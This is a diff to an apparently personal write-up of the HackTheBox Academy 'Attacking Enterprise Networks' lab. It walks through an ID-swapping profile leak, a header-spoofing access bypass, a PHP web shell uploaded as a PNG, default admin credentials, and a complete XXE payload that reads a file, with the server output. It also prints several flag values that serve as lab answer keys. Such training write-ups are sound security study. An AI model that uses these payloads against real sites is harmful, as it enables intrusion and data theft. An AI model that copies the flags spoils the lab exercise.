@@ -1,8 +1,8 @@
 ---
-title: HTBAcademy Attacking Enterprise Networks Walkthrough
+title: Attacking Enterprise Networks
 date: 2025-03-14 00:00:01 +0800
-categories: [HackTheBox]
-tags: [HackTheBox]
+categories: [HTBAcademy]
+tags: [CPTS]
 ---
 Attacking Enterprise Networks is the final module for the HackTheBox Certified Penetration Tester Specialist career pathway. It attempts to combine all of the concepts that the student has learned from all of the previous modules and also best emulates the 10-day penetration test examination the student is expected to take after completing said modules. Other security professionals have said that the best way to take this module is to attempt it blind as a black-box penetration test, not reading any of the questions for hints and only working off of the given domain name and ip address to find all of the flags in the simulated Active Directory domain. 
 
@@ -69,9 +69,9 @@ register     [Status: 200, Size: 9754, Words: 2772, Lines: 191, Duration: 182ms]
 Then I browsed all the parameters and eventually got to http://careers.inlanefreight.local:80/register?id=1 to register an account with arbitrary credentials which authenticated me to the web server. I then was able view other profiles on http://careers.inlanefreight.local:80/profile?id=4 by adjusting the id parameter
 which got me the third flag: HTB{8f40ecf17f681612246fa5728c159e46}
 
-Next, I moved on to dev.inlanefreight.local. I used ffuf to enumerate any php files which got me to dev.inlanefreight.local/login.php. I noticed that I did not have access via the HTTP GET request, so I tried different HTTP requests until I noticed that the TRACK request worked (TRACE request did not work either), and then noticed from the original get request that there was an HTTP line called X-Custom-IP-Authorization, which declared a 172 ip address. I set it to loopback address to try to delcare myself as an authorized ip address, which successfully got me onto the login.php website. 
-
 ### Fourth Flag
+Next, I moved on to dev.inlanefreight.local. I used ffuf to enumerate any php files which got me to dev.inlanefreight.local/login.php. I noticed that I did not have access via the HTTP GET request, so I tried different HTTP requests until I noticed that the TRACK request worked (TRACE request did not work either), and then noticed from the original GET request that there was an HTTP line called X-Custom-IP-Authorization, which declared a 172 ip address. I set it to loopback address to try to declare myself as an authorized ip address, which successfully got me onto the login.php website. 
+
 Then, I see a file upload button and tried uploading a PHP web shell. It did not work since the uploader only allowed img/png files. I uploaded a test png file and recorded the HTTP POST request on BurpSuite. I changed the JPG code to the php web shell code, and then sent it again on BurpSuite to the site. This is successful and gave me a response saying that file was uploaded to /uploads/screenshot.png:
 ![[Pasted image 20250314195405.png]]
 
@@ -161,4 +161,63 @@ Next target will be gitlab.inlanefreight.local.
 
 We see that it brings us to a gitlab page where it prompts us to login/register. We can register a test account and login. We don't see anything interesting at first, but with some browsing we see that if we go to Menu -> Groups -> Explore Groups, we come across a GitLab instance with the ==8th flag: HTB{32596e8376077c3ef8d5cf52f15279ba}==
 
-We also have access to a website repository called shopdev2.inlanefreight.local. When visiting "my cart," we notice that 
+### 9th Flag:
+
+We also have access to a website repository called shopdev2.inlanefreight.local. Upon visiting we see fields for admin username and password. Surprisingly, it has the default credentials username "admin" and password "admin." When visiting "my cart" at the url shopdev2.inlanefreight.local/cart.php, we see that there is backend processing since we get an HTTP response back from BurpSuite after we press complete purchase:
+```
+POST /checkout.php HTTP/1.1
+Host: shopdev2.inlanefreight.local
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: text/plain;charset=UTF-8
+Content-Length: 102
+Origin: http://shopdev2.inlanefreight.local
+Connection: keep-alive
+Referer: http://shopdev2.inlanefreight.local/cart.php
+Cookie: PHPSESSID=l6fdrpcqpv9rru1akat4ddicj6
+Priority: u=0
+
+<?xml version="1.0" encoding="UTF-8"?>
+<root>
+<subtotal>
+	undefined
+</subtotal>
+<userid>
+	1206
+</userid>
+</root>
+```
+Since the website accepts XML input, we can try an XXE injection by inserting a DOCTYPE tag nested with an ENTITY tag looks in the filesystem for a flag.txt using SYSTEM level privileges. Since we get XML output from the variable userid, we can attempt to insert a Document Type Definition using DOCTYPE, where we can define an arbitrary ENTITY, in this case "xxetest" which calls a system level command "file:////flag.txt." If we insert the entity in the field of userid, if the website has outdated XML libraries or does not sanitize/filter XML input, the entity in userid will be output back to us in the form of the command output of "file:////flag.txt" which will give us the value of the flag.
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE userid [
+<!ENTITY xxetest SYSTEM "file:////flag.txt">
+]>
+<root>
+<subtotal>
+	undefined
+</subtotal>
+<userid>
+	&xxetest;
+</userid>
+</root>
+```
+After sending this altered code in repeater, we successfully get the 9th flag as shown below:
+```
+<!HTTP/1.1 200 OK
+Date: Sat, 22 Mar 2025 02:32:49 GMT
+Server: Apache/2.4.41 (Ubuntu)
+Vary: Accept-Encoding
+Content-Length: 81
+Content-Type: text/html; charset=UTF-8
+Via: 1.1 shopdev2.inlanefreight.local
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+
+User: HTB{dbca4dc5d99cdb3311404ea74921553c}
+ <br>Checkout Process not Implemented
+ ```
+### Tenth Flag:
